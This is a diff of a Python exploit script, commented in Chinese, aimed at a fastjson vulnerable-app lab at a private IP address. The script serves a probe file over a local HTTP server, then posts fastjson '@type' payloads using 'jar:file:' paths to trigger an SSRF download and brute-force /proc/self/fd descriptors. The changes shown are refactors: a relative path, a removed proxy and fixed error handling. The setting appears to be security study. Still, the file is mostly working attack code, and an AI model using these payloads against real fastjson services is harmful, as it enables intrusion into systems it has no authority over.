@@ -8,13 +8,12 @@
 """
 import http.server, threading, requests, os
 
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+
 TARGET = "http://192.168.50.2:4125/1283"          # WSL 靶场 /parse
 HOST, PORT = "192.168.50.1", 11111                   # 本地攻击 HTTP
-PROBE = os.path.abspath(r"D:\project\java\vulapp\fastjson\www\probe_file")
+PROBE = os.path.join(BASE_DIR, "www", "probe_file")  # 相对脚本路径
 
-proxies = {
-    "http": "http://localhost:10002"
-}
 
 def ip_int(ip):
     a, b, c, d = map(int, ip.split("."))
@@ -22,11 +21,12 @@ def ip_int(ip):
 
 
 def send(payload):
+    """始终返回 (status_code, text) 元组；网络异常时 status_code=None，避免调用方解包崩溃。"""
     try:
-        rsp = requests.post(TARGET, json=payload, timeout=4, proxies=proxies)
-        return rsp.status_code, rsp.text;
+        rsp = requests.post(TARGET, json=payload, timeout=4)
+        return rsp.status_code, rsp.text
     except Exception as e:
-        return f"<{type(e).__name__}>"
+        return None, f"<{type(e).__name__}>"
 
 
 # 阶段0: 起本地 HTTP 提供 probe_file
@@ -43,7 +43,7 @@ print("[1] SSRF download -> jar_cache (fd kept open)")
 print("[2] brute force fd 1..100")
 for fd in range(1, 101):
     status_code, rsp_text = send({"@type": f"jar:file:.proc.self.fd.{fd}!.E{fd}"})
-    if(status_code == 200):
+    if status_code == 200:
         print(f"\033[032m[+] hit!\033[0m")
         print(f"fd={fd:3d}  {rsp_text}")
         break
